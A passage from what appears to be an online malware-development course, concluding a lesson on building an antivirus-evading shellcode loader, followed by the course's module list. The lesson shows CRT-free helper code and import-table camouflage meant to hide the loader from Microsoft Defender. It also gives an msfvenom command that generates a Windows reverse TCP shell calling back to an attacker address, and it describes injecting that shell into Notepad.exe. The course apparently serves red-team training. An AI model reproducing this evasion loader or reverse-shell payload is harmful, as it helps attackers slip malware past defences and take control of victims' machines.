            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  



#endif // DEBUG
</code></pre>
<pre><code class="language-C">// Only print if debug mode is enabled
#ifdef DEBUG
	PRINTA("...");
#endif
</code></pre>
<p>If one attempts to compile after this, they will encounter more errors because <code>memcpy</code>, <code>memset</code>, <code>toupper</code>
 are also imported from the CRT library. To fix this issue, custom 
functions that will execute the same logic must be added and stored in <code>WinApi.c</code>, which is shown below.</p>
<p><strong>WinApi.c</strong></p>
<pre><code class="language-C">CHAR _toUpper(CHAR C)
{
	if (C &gt;= 'a' &amp;&amp; C &lt;= 'z')
		return C - 'a' + 'A';

	return C;
}

PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{
	for (volatile int i = 0; i &lt; Size; i++) {
		((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
	}
	return Destination;
}



extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* Destination, int Value, size_t Size) {
	unsigned char* p = (unsigned char*)Destination;
	while (Size &gt; 0) {
		*p = (unsigned char)Value;
		p++;
		Size--;
	}
	return Destination;
}
</code></pre>
<p>There is one final error to solve which is the undefined <code>_fltused</code> symbol. The <code>_fltused</code>
 symbol is a global variable in the CRT Library which is used to 
determine if floating-point operations were used in a program. By 
creating a new variable named <code>_fltused</code> and setting it to 
zero, the error will be resolved. This mirrors the initialization of the
 variable by the CRT Library, which will result in the compiler building
 the project with no errors.</p>
<h3>IAT Camouflage</h3>
<p>Adding the header file <code>IatCamouflage.h</code>, which contains the same code introduced in the <em>IAT Camouflage</em> module, should be done as a final step. <code>IatCamouflage.h</code> should be included in the <code>main.c</code>
 file only and called at the beginning of the main function, so that the
 import address table of the implementation will appear benign.</p>
<h3>Final Result</h3>
<p>This demonstration uses Msfvenom's reverse TCP shell payload which is generated via the command below.</p>
<pre><code class="language-C">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw -o reverse.bin
</code></pre>
<p><code>AV.exe</code>'s IAT is shown below.</p>
<p><img src="81_files/av-bypass-15.png" alt="image"></p>
<p>Next, <code>AV.exe</code> injects into <code>Notepad.exe</code> with Microsoft Defender enabled.</p>
<p><img src="81_files/av-bypass-16.png" alt="image"></p>
<p>A successful reverse shell is established to the attacking machine and a sample command is executed.</p>
<p><img src="81_files/av-bypass-17.png" alt="image"></p>
<p>The <code>Notepad.exe</code> process has PID 20288, which matches the PID in the previous picture.</p>
<p><img src="81_files/av-bypass-18.png" alt="image"></p>

    </div>

    
       
</div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Implement a loader capable of bypassing Microsoft Defender and other security solutions</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Customize the loader to incorporate different techniques demonstrated in this course (e.g. PPID spoofing)</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        <div id="toc-skeleton" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2 ml-8 animate-pulse space-y-2">
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        </div>

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
        
        </div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="81_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Welcome Module
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Introduction To Malware Development
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./3.html">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Required Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Coding Basics
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Windows Architecture
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Windows Memory Management
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Introduction To The Windows API
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Portable Executable Format
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Dynamic-Link Library
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Detection Mechanisms
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Windows Processes
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./12.html">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Undocumented Structures
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Payload Placement - .data &amp; .rdata Sections
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Payload Placement - .text Section
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Payload Placement - .rsrc Section
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Introduction To Payload Encryption
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Payload Encryption - XOR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Payload Encryption - RC4
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Payload Encryption - AES Encryption
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Evading Microsoft Defender Static Analysis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Payload Obfuscation - IPv4/IPv6Fuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Payload Obfuscation - MACFuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Payload Obfuscation - UUIDFuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Maldev Academy Tool - HellShell
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Maldev Academy Tool - MiniShell
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - Local Payload Execution - DLL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Local Payload Execution - Shellcode
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Process Injection - DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Process Injection - Shellcode Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - Payload Staging - Web Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Payload Staging - Windows Registry
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Binary Signing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Process Enumeration - EnumProcesses
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - Process Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Thread Hijacking - Local Thread Creation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Thread Hijacking - Remote Thread Creation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Thread Hijacking - Local Thread Enumeration
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Thread Hijacking - Remote Thread Enumeration
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - APC Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Early Bird APC Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Callback Code Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Local Mapping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Remote Mapping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Local Function Stomping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Remote Function Stomping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Payload Execution Control
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Spoofing PPID
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Argument Spoofing (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Process Argument Spoofing (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Parsing PE Headers
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - String Hashing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - IAT Hiding &amp; Obfuscation - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
